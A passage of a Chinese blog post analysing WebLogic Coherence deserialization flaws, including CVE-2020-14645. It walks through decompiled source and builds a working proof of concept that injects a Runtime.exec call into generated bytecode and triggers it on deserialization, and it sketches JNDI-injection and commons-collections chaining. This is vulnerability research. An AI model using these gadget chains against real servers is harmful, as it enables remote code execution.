class="comment">/*     */</span>       &#125;  </span><br><span class="line"><span class="comment">/*     */</span>     Remotable&lt;T&gt; instance = (Remotable&lt;T&gt;)definition.createInstance(constructor.getArguments());</span><br><span class="line"><span class="comment">/*     */</span>     instance.setRemoteConstructor(constructor);</span><br><span class="line"><span class="comment">/*     */</span>     <span class="keyword">return</span> (T)instance;</span><br><span class="line"><span class="comment">/*     */</span>   &#125;</span><br><span class="line"><span class="comment">/*     */</span>   </span><br><span class="line"><span class="comment">/*     */</span>   <span class="keyword">protected</span> Class&lt;? <span class="keyword">extends</span> <span class="title class_">Remotable</span>&gt; defineClass(ClassDefinition definition) &#123;</span><br><span class="line"><span class="comment">/*     */</span>     <span class="type">String</span> <span class="variable">sBinClassName</span> <span class="operator">=</span> definition.getId().getName();</span><br><span class="line"><span class="comment">/*     */</span>     <span class="type">String</span> <span class="variable">sClassName</span> <span class="operator">=</span> sBinClassName.replace(<span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line"><span class="comment">/*     */</span>     <span class="type">byte</span>[] abClass = definition.getBytes();</span><br><span class="line"><span class="comment">/*     */</span>     definition.dumpClass(DUMP_REMOTABLE);</span><br><span class="line"><span class="comment">/*     */</span>     <span class="keyword">return</span> <span class="built_in">this</span>.defineClass(sClassName, abClass, <span class="number">0</span>, abClass.length);</span><br><span class="line"><span class="comment">/*     */</span>   &#125;</span><br><span class="line"><span class="comment">/*     */</span></span><br><span class="line"><span class="comment">/*     */</span>   <span class="keyword">public</span> Object <span class="title function_">createInstance</span><span class="params">(Object... aoArgs)</span> &#123;</span><br><span class="line"><span class="comment">/*     */</span>     <span class="keyword">try</span> &#123;</span><br><span class="line"><span class="comment">/* 149 */</span>       <span class="keyword">return</span> getConstructor(aoArgs).invokeWithArguments(aoArgs);</span><br><span class="line"><span class="comment">/*     */</span>     &#125;</span><br><span class="line"><span class="comment">/* 151 */</span>     <span class="keyword">catch</span> (NoSuchMethodException e) &#123;</span><br><span class="line"><span class="comment">/*     */</span> </span><br><span class="line"><span class="comment">/*     */</span>       </span><br><span class="line"><span class="comment">/* 154 */</span>       Constructor[] aCtors = (Constructor[])<span class="built_in">this</span>.m_clz.getDeclaredConstructors();</span><br><span class="line"><span class="comment">/* 155 */</span>       <span class="keyword">for</span> (Constructor ctor : aCtors) &#123;</span><br><span class="line"><span class="comment">/*     */</span>         </span><br><span class="line"><span class="comment">/* 157 */</span>         <span class="keyword">if</span> ((ctor.getParameterTypes()).length == aoArgs.length) &#123;</span><br><span class="line"><span class="comment">/*     */</span>           </span><br><span class="line"><span class="comment">/*     */</span>           <span class="keyword">try</span> &#123;</span><br><span class="line"><span class="comment">/*     */</span>             </span><br><span class="line"><span class="comment">/* 161 */</span>             <span class="keyword">return</span> ctor.newInstance(aoArgs);</span><br><span class="line"><span class="comment">/*     */</span>           &#125;</span><br><span class="line"><span class="comment">/* 163 */</span>           <span class="keyword">catch</span> (InstantiationException|java.lang.reflect.InvocationTargetException|IllegalAccessException|IllegalArgumentException instantiationException) &#123;&#125;</span><br><span class="line"><span class="comment">/*     */</span>         &#125;</span><br><span class="line"><span class="comment">/*     */</span>       &#125; </span><br></pre></td></tr></table></figure>
+
+<p>可以看到 realize 函数中调用了一个 defineClass 函数，这里调用了父类 ClassLoader 的 defineClass 函数，可以从字节码中加载一个类。还可以看到 createInstance 函数疑似做了实例化对象的操作，但是我们不确定能否控制这个实例化的类为我们加载的类，从而执行它的构造函数来实现 RCE，我们可以先写一段简单的测试代码然后慢慢推进到：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">RemoteConstructor</span> <span class="variable">remoteConstructor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteConstructor</span>();</span><br><span class="line">deserialize(serialize(remoteConstructor));</span><br></pre></td></tr></table></figure>
+
+<p>然后执行会得到报错：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Exception in thread &quot;main&quot; java.lang.NullPointerException</span><br><span class="line">	at com.tangosol.internal.util.invoke.RemotableSupport.registerIfAbsent(RemotableSupport.java:161)</span><br></pre></td></tr></table></figure>
+
+<p>从头开始理一遍流程，先看 getClassLoader 函数，</p>
+<h5 id="getClassLoader"><a href="#getClassLoader" class="headerlink" title="getClassLoader"></a>getClassLoader</h5><p>因为 m_loader 变量是一个 transient 变量，所以这个函数的返回值不可控，调试得到的结果为 AppClassLoader：</p>
+<p><img src="/css/images/coherence/2020090104.png" srcset="/img/loading.gif"></p>
+<h5 id="RemotableSupport-get"><a href="#RemotableSupport-get" class="headerlink" title="RemotableSupport.get"></a>RemotableSupport.get</h5><p>因为 RemotableSupport 不是从反序列化中获取的，调用的 get 函数为一个静态函数，且 loader 为 AppClassLoader，所以返回值也不可控，这两步的返回结果为一个不可控的 RemotableSupport 对象。</p>
+<h5 id="support-realize"><a href="#support-realize" class="headerlink" title="support.realize"></a>support.realize</h5><p>可以看到这个函数中的大部分操作都来自 definition 变量，而这个变量来自 constructor.getDefinition()：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*     */</span>   <span class="keyword">public</span> ClassDefinition <span class="title function_">getDefinition</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="comment">/*  97 */</span>     <span class="keyword">return</span> <span class="built_in">this</span>.m_definition;</span><br><span class="line"><span class="comment">/*     */</span>   &#125;</span><br></pre></td></tr></table></figure>
+
+<p>这是一个 protected 变量，且其类型为可序列化的 ClassDefinition，可以通过反序列化传入来控制。</p>
+<p>然后是 registerIfAbsent 函数：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*     */</span>   <span class="keyword">protected</span> ClassDefinition <span class="title function_">registerIfAbsent</span><span class="params">(ClassDefinition definition)</span> &#123;</span><br><span class="line"><span class="comment">/*     */</span>     <span class="keyword">assert</span> definition != <span class="literal">null</span>;</span><br><span class="line"><span class="comment">/*     */</span>     <span class="type">ClassDefinition</span> <span class="variable">rtn</span> <span class="operator">=</span> <span class="built_in">this</span>.f_mapDefinitions.putIfAbsent(definition.getId(), definition);</span><br><span class="line"><span class="comment">/*     */</span>     <span class="keyword">return</span> (rtn == <span class="literal">null</span>) ? definition : rtn;</span><br><span class="line"><span class="comment">/*     */</span>   &#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个函数会调用 ConcurrentHashMap 的 putIfAbsent 函数以 definition.getId() 为键将 definition 放入 f_mapDefinitions 并返回结果（题外话，反编译出来的这个类调试不能，换用 IDEA 自己的反编译），而前面的报错就是因为我们序列化的 RemoteConstructor 中没有 definition，所以这里的 definition 为 null，修改一下测试代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ClassDefinition</span> <span class="variable">classDefinition</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassDefinition</span>();</span><br><span class="line"><span class="type">RemoteConstructor</span> <span class="variable">remoteConstructor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteConstructor</span>(classDefinition, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">deserialize(serialize(remoteConstructor));</span><br></pre></td></tr></table></figure>
+
+<p>发现下一个报错：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Exception in thread &quot;main&quot; java.lang.NullPointerException</span><br><span class="line">	at java.util.concurrent.ConcurrentHashMap.putVal(ConcurrentHashMap.java:1011)</span><br></pre></td></tr></table></figure>
+
+<p>原因是 putIfAbsent 的键为空，看下这个 getId 函数：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> ClassIdentity <span class="title function_">getId</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">this</span>.m_id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>返回的同样是一个可序列化的变量，可以控制。</p>
+<p>修改代码继续测试：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ClassIdentity</span> <span class="variable">classIdentity</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassIdentity</span>();</span><br><span class="line"><span class="type">ClassDefinition</span> <span class="variable">classDefinition</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassDefinition</span>(classIdentity, <span class="literal">null</span>);</span><br><span class="line"><span class="type">RemoteConstructor</span> <span class="variable">remoteConstructor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteConstructor</span>(classDefinition, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">deserialize(serialize(remoteConstructor));</span><br></pre></td></tr></table></figure>
+
+<p>报错：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Exception in thread &quot;main&quot; java.lang.NullPointerException</span><br><span class="line">	at com.tangosol.internal.util.invoke.ClassIdentity.hashCode(ClassIdentity.java:142)</span><br></pre></td></tr></table></figure>
+
+<p>原因是 HashMap 在 put 的过程中往往要调用键的 hashCode 函数，所以我们再看看 ClassIdentity 的 hashCode 函数：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">nHash</span> <span class="operator">=</span> <span class="built_in">this</span>.m_sPackage.hashCode();</span><br><span class="line">    nHash = <span class="number">31</span> * nHash + <span class="built_in">this</span>.m_sBaseName.hashCode();</span><br><span class="line">    nHash = <span class="number">31</span> * nHash + <span class="built_in">this</span>.m_sVersion.hashCode();</span><br><span class="line">    <span class="keyword">return</span> nHash;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>所以在生成 payload 的时候还需要给 ClassIdentity 传入这几个参数，这时候的代码如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ClassIdentity</span> <span class="variable">classIdentity</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassIdentity</span>(Evil.class);</span><br><span class="line"><span class="type">ClassDefinition</span> <span class="variable">classDefinition</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassDefinition</span>(classIdentity, <span class="literal">null</span>);</span><br><span class="line"><span class="type">RemoteConstructor</span> <span class="variable">remoteConstructor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteConstructor</span>(classDefinition, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">deserialize(serialize(remoteConstructor));</span><br></pre></td></tr></table></figure>
+
+<h5 id="defineClass-1"><a href="#defineClass-1" class="headerlink" title="defineClass"></a>defineClass</h5><p>下一个报错：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Exception in thread <span class="string">&quot;main&quot;</span> java.lang.NullPointerException</span><br><span class="line">	at com.tangosol.internal.util.invoke.RemotableSupport.defineClass(RemotableSupport.java:<span class="number">181</span>)</span><br></pre></td></tr></table></figure>
+
+<p>可以看到错误发生在 defineClass 函数，原因是我们序列化的 ClassDefinition 中没有类的字节码，我们用动态编程加上构造一个：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line"><span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> classPool.get(Evil.class.getName());</span><br><span class="line"><span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>;</span><br><span class="line">clazz.makeClassInitializer().insertAfter(code);</span><br><span class="line">clazz.setName(<span class="string">&quot;com/example/weblogic/RCE$Twings&quot;</span>);</span><br><span class="line"><span class="type">byte</span>[] classByte = clazz.toBytecode();</span><br><span class="line"></span><br><span class="line"><span class="type">ClassIdentity</span> <span class="variable">classIdentity</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassIdentity</span>();</span><br><span class="line">setFieldValue(classIdentity, <span class="string">&quot;m_sPackage&quot;</span>, <span class="string">&quot;com/example/weblogic&quot;</span>);</span><br><span class="line">setFieldValue(classIdentity, <span class="string">&quot;m_sBaseName&quot;</span>, <span class="string">&quot;RCE&quot;</span>);</span><br><span class="line">setFieldValue(classIdentity, <span class="string">&quot;m_sVersion&quot;</span>, <span class="string">&quot;Twings&quot;</span>);</span><br><span class="line"><span class="type">ClassDefinition</span> <span class="variable">classDefinition</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassDefinition</span>(classIdentity, classByte);</span><br><span class="line"><span class="type">RemoteConstructor</span> <span class="variable">remoteConstructor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteConstructor</span>(classDefinition, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">deserialize(serialize(remoteConstructor));</span><br></pre></td></tr></table></figure>
+
+<p>然后就没有下一个报错了，计算器弹了出来，emmmmmm。</p>
+<h5 id="definition-setRemotableClass"><a href="#definition-setRemotableClass" class="headerlink" title="definition.setRemotableClass"></a>definition.setRemotableClass</h5><p>defineClass 从字节码中加载类之后，会调用 setRemotableClass 获取构造函数：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setRemotableClass</span><span class="params">(Class&lt;? extends Remotable&gt; clz)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.m_clz = clz;</span><br><span class="line">    Constructor&lt;?&gt;[] aCtor = clz.getDeclaredConstructors();</span><br><span class="line">    <span class="keyword">if</span> (aCtor.length == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">MethodType</span> <span class="variable">ctorType</span> <span class="operator">=</span> MethodType.methodType(Void.TYPE, aCtor[<span class="number">0</span>].getParameterTypes());</span><br><span class="line">            <span class="built_in">this</span>.m_mhCtor = MethodHandles.publicLookup().findConstructor(clz, ctorType);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException | NoSuchMethodException var4) &#123;</span><br><span class="line">        	<span class="keyword">throw</span> Base.ensureRuntimeException(var4);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>当只有一个构造函数时，会将该构造函数相关的信息存入 m_mhCtor 变量。</p>
+<h5 id="createInstance"><a href="#createInstance" class="headerlink" title="createInstance"></a>createInstance</h5><p>函数参数为 constructor.getArguments()，即实例化 RemoteConstructor 时传入的 Object[0]，也就是无参函数的意思。</p>
+<p>跟入 getConstructor 函数：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> MethodHandle <span class="title function_">getConstructor</span><span class="params">(Object[] aoArgs)</span> <span class="keyword">throws</span> NoSuchMethodException &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.m_mhCtor != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.m_mhCtor;</span><br><span class="line">    &#125; </span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个函数用于从加载的类中获取构造函数，但是因为我们传入的字节码类只有一个构造函数，所以查找结果与参数类型无关，会不寻找直接返回该构造函数。</p>
+<p>然后则是 invokeWithArguments 函数，看名字明显是反射调用构造函数，于是就执行了恶意的构造函数代码。</p>
+<p>不过最后还有一个错误：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Exception in thread &quot;main&quot; java.lang.ClassCastException: com.example.weblogic.RCE$Twings cannot be cast to com.tangosol.internal.util.invoke.Remotable</span><br></pre></td></tr></table></figure>
+
+<p>可以锦上添花解决一下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">classPool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(Remotable.class));</span><br><span class="line"><span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> classPool.get(Evil.class.getName());</span><br><span class="line"><span class="type">CtClass</span> <span class="variable">remotable</span> <span class="operator">=</span> classPool.get(Remotable.class.getName());</span><br><span class="line"><span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>;</span><br><span class="line">clazz.makeClassInitializer().insertAfter(code);</span><br><span class="line"><span class="type">CtMethod</span> <span class="variable">setRemoteConstructor</span> <span class="operator">=</span> CtMethod.make(<span class="string">&quot;public void setRemoteConstructor(com.tangosol.internal.util.invoke.RemoteConstructor remoteConstructor)&#123;&#125;&quot;</span>, clazz);</span><br><span class="line"><span class="type">CtMethod</span> <span class="variable">getRemoteConstructor</span> <span class="operator">=</span> CtMethod.make(<span class="string">&quot;public com.tangosol.internal.util.invoke.RemoteConstructor getRemoteConstructor()&#123;return null;&#125;&quot;</span>, clazz);</span><br><span class="line">clazz.addMethod(setRemoteConstructor);</span><br><span class="line">clazz.addMethod(getRemoteConstructor);</span><br><span class="line">clazz.setName(<span class="string">&quot;com/example/weblogic/RCE$Twings&quot;</span>);</span><br><span class="line">clazz.setInterfaces(<span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;remotable&#125;);</span><br><span class="line"><span class="type">byte</span>[] classByte = clazz.toBytecode();</span><br><span class="line"></span><br><span class="line"><span class="type">ClassIdentity</span> <span class="variable">classIdentity</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassIdentity</span>();</span><br><span class="line">setFieldValue(classIdentity, <span class="string">&quot;m_sPackage&quot;</span>, <span class="string">&quot;com/example/weblogic&quot;</span>);</span><br><span class="line">setFieldValue(classIdentity, <span class="string">&quot;m_sBaseName&quot;</span>, <span class="string">&quot;RCE&quot;</span>);</span><br><span class="line">setFieldValue(classIdentity, <span class="string">&quot;m_sVersion&quot;</span>, <span class="string">&quot;Twings&quot;</span>);</span><br><span class="line"><span class="type">ClassDefinition</span> <span class="variable">classDefinition</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassDefinition</span>(classIdentity, classByte);</span><br><span class="line"><span class="type">RemoteConstructor</span> <span class="variable">remoteConstructor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteConstructor</span>(classDefinition, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">deserialize(serialize(remoteConstructor));</span><br></pre></td></tr></table></figure>
+
+<h3 id="CVE-2020-14645"><a href="#CVE-2020-14645" class="headerlink" title="CVE-2020-14645"></a>CVE-2020-14645</h3><p>CVE-2020-14645 是 CVE-2020-2883 的绕过，在 ReflectionExtractor 被禁止了的情况下，用 UniversalExtractor 构造一条新的利用链，<a href="https://paper.seebug.org/1280/">参考文章1</a>，<a href="https://paper.seebug.org/1287">参考文章2</a>。</p>
+<p>我们来看看 UniversalExtractor 的 extarct 函数长什么样：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> E <span class="title function_">extract</span><span class="params">(T oTarget)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (oTarget == <span class="literal">null</span>) &#123;</span><br><span class="line">    	<span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">TargetReflectionDescriptor</span> <span class="variable">targetPrev</span> <span class="operator">=</span> <span class="built_in">this</span>.m_cacheTarget;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (targetPrev != <span class="literal">null</span> &amp;&amp; oTarget.getClass() == targetPrev.getTargetClass()) &#123;</span><br><span class="line">            	<span class="keyword">return</span> targetPrev.isMap() ? ((Map)oTarget).get(<span class="built_in">this</span>.getCanonicalName()) : targetPrev.getMethod().invoke(oTarget, <span class="built_in">this</span>.m_aoParam);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            	<span class="keyword">return</span> <span class="built_in">this</span>.extractComplex(oTarget);</span><br><span class="line">       	 	&#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NullPointerException var4) &#123;</span><br><span class="line">        	<span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="built_in">this</span>.suggestExtractFailureCause(oTarget.getClass()));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var5) &#123;</span><br><span class="line">        	<span class="keyword">throw</span> ensureRuntimeException(var5, oTarget.getClass().getName() + <span class="built_in">this</span> + <span class="string">&#x27;(&#x27;</span> + oTarget + <span class="string">&#x27;)&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>因为变量 m_cacheTarget 是个 transient 变量，所以会执行 this.extractComplex(oTarget)：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> E <span class="title function_">extractComplex</span><span class="params">(T oTarget)</span> <span class="keyword">throws</span> InvocationTargetException, IllegalAccessException &#123;</span><br><span class="line">    <span class="type">Class</span> <span class="variable">clzTarget</span> <span class="operator">=</span> oTarget.getClass();</span><br><span class="line">    Object[] aoParam = <span class="built_in">this</span>.m_aoParam;</span><br><span class="line">    Class[] clzParam = ClassHelper.getClassArray(aoParam);</span><br><span class="line">    <span class="type">String</span> <span class="variable">sCName</span> <span class="operator">=</span> <span class="built_in">this</span>.getCanonicalName();</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">fProperty</span> <span class="operator">=</span> <span class="built_in">this</span>.isPropertyExtractor();</span><br><span class="line">    <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (fProperty) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">sBeanAttribute</span> <span class="operator">=</span> Character.toUpperCase(sCName.charAt(<span class="number">0</span>)) + sCName.substring(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">cchPrefix</span> <span class="operator">=</span> <span class="number">0</span>; cchPrefix &lt; BEAN_ACCESSOR_PREFIXES.length &amp;&amp; method == <span class="literal">null</span>; ++cchPrefix) &#123;</span><br><span class="line">        	method = ClassHelper.findMethod(clzTarget, BEAN_ACCESSOR_PREFIXES[cchPrefix] + sBeanAttribute, clzParam, <span class="literal">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    	method = ClassHelper.findMethod(clzTarget, <span class="built_in">this</span>.getMethodName(), clzParam, <span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (method == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (fProperty &amp;&amp; oTarget <span class="keyword">instanceof</span> Map) &#123;</span><br><span class="line">            <span class="built_in">this</span>.m_cacheTarget = <span class="keyword">new</span> <span class="title class_">TargetReflectionDescriptor</span>(clzTarget);</span><br><span class="line">            <span class="keyword">return</span> ((Map)oTarget).get(sCName);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    	<span class="built_in">this</span>.m_cacheTarget = <span class="keyword">new</span> <span class="title class_">TargetReflectionDescriptor</span>(clzTarget, method);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> method.invoke(oTarget, aoParam);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>fProperty 变量来自 isPropertyExtractor：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isPropertyExtractor</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> !<span class="built_in">this</span>.m_fMethod;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>m_fMethod 也是个 transient 变量，所以 fProperty 为 true，那么接下来就会有两个选择，要么通过反射执行一次 getXXX 或者 isXXX 函数：</p>
+<p><img src="/css/images/coherence/2020090105.png" srcset="/img/loading.gif"></p>
+<p>要么进入 method &#x3D;&#x3D; null 的分支，调用某个 Map 类的 get 函数。</p>
+<p>那么攻击的思路也很明确了，执行一次 getDatabaseMetaData 函数可以进行 JNDI 注入：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> DatabaseMetaData <span class="title function_">getDatabaseMetaData</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">    <span class="type">Connection</span> <span class="variable">var1</span> <span class="operator">=</span> <span class="built_in">this</span>.connect();</span><br><span class="line">    <span class="keyword">return</span> var1.getMetaData();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>而调用 Map.get 可以用来接上 apache-commons-collections 的利用链。</p>
+<hr>
+<p>Orz</p>
+
+            </div>
+            <hr>
+            <div>
+              <p>
+                
+                
+                  <span>
+                <i class="iconfont icon-tag"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/Web/">Web</a>
+                    
+                      <a class="hover-with-bg" href="/tags/Java/">Java</a>
+                    
+                      <a class="hover-with-bg" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">反序列化</a>
+                    
